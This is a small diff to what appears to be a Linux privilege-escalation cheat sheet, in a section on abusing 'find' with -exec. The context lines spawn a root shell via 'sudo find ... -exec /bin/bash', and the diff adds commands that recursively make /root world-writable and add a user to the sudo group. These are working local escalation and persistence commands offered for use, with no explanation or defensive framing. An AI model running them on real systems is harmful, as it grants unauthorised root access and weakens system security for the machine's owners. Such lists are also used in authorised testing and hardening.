@@ -207,6 +207,12 @@ Find
 sudo find / etc/passwd -exec /bin/bash \;
 ```
 ```
+find . -exec chmod -R 777 /root \;
+```
+```
+find . -exec usermod -aG sudo user \;
+```
+```
 sudo find /home -exec /bin/bash \;
 ```
 
